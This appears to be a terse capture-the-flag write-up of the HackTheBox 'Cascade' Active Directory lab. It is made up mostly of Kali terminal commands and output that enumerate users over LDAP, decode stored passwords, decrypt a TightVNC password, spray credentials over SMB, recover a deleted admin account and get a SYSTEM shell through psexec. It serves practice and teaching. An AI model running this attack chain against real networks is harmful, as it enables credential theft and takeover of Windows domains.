```bash
                                                                                                                                                                        
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade]
└─$ windapsearch -m users -d cascade.local --dc-ip 10.10.10.182 | grep "sAMAccountName: " | awk {'print $2'} > users.txt
                                                                                                                                                                        
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade]
└─$ cat users.txt                                            
util
j.wakefield
CascGuest
arksvc
r.thompson
s.hickson
b.hanson
d.burman
j.goodhand
a.turnbull
e.crowe
BackupSvc
j.allen
i.croft
s.smith

```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade]
└─$ ldapsearch -LLL -x -H ldap://cascade.local -b 'DC=cascade,DC=local'
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade]
└─$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva                                                                                                                                                                        
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade]
└─$ crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

```
```bash
            
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade/smb]
└─$ cat VNC\ Install.reg         
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
-------snip------
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
------------snip----
"VideoClasses"=""
"VideoRects"=""

                                                                                                                                                                                                                                                                                                                                             
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade/smb]
└─$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
140737348040512:error:0E079065:configuration file routines:def_load_bio:missing equal sign:../crypto/conf/conf_def.c:407:line 91
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008

```

```bash
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> false
>> true
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"

```

sT333ve2

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Cascade]
└─$ crackmapexec smb 10.10.10.182 -u users.txt -p 'sT333ve2'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\util:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\j.wakefield:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\r.thompson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\s.hickson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\b.hanson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\d.burman:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\j.goodhand:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\a.turnbull:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\e.crowe:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\BackupSvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\j.allen:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\i.croft:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 

```

```
sqlitebrowser Audit.db

1	ArkSvc	BQO5l5Kj9MdErXx6Q6AGOw==	cascade.local
```

Reverse the exe file which on smb audit$ share to crack this : BQO5l5Kj9MdErXx6Q6AGOw==

r.thompson:rY4n5eva

s.smith:sT333ve2

arksvc:w3lc0meFr31nd

## Privesc

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059



*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM



*Evil-WinRM* PS C:\Users\arksvc\Documents> 

```

cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz

```bash
┌──(arun㉿kali)-[~]
└─$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles                                                                                                                                                                        
┌──(arun㉿kali)-[~]
└─$ impacket-psexec cascade.local/administrator@10.10.10.182
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.182.....
[*] Found writable share ADMIN$
[*] Uploading file BdPdsfNs.exe
[*] Opening SVCManager on 10.10.10.182.....
[*] Creating service pqCk on 10.10.10.182.....
[*] Starting service pqCk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami  
nt authority\system

```


